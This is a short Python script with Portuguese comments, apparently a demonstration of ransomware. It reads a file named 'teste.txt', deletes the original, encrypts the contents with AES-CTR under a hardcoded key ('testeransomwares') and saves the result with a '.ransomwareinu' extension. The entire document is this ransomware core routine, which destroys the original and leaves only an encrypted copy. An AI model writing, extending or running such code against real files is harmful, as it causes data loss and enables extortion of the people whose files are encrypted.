import os
import pyaes

## Abrindo o arquivo criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Removendo o arquivo
os.remove(file_name)

## Chave de criptografia, que contém 16 caracteres
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografando o arquivo
crypto_data = aes.encrypt(file_data)

## Salvando o arquivo criptografado
new_file = file_name + ".ransomwareinu"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
